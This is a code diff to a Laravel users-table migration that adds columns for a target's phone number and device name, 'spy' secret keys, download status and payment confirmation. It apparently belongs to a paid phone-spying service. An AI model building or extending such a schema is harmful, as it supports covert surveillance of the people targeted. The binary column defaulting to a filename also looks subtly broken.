@@ -26,6 +26,15 @@ class CreateUsersTable extends Migration
             $table->string('ip_address')->nullable();
             $table->timestamp('last_login_at')->nullable();
             $table->timestamp('email_verified_at')->nullable();
+            $table->string('profile_url')->default('blank.profile.picture.png');
+            $table->binary('profile_picture')->default('blank.profile.picture.png');
+            $table->string('target_phone_number')->nullable();
+            $table->string('target_device_name')->nullable();
+            $table->string('status')->default('pending');
+            $table->string('spy_secret_key')->nullable()->unique();
+            $table->string('spy_secret_value')->nullable()->unique();
+            $table->boolean('downloaded')->default(0);
+            $table->boolean('is_payment_confirmed')->default(0);
             $table->string('password');
             $table->rememberToken();
             $table->timestamps();
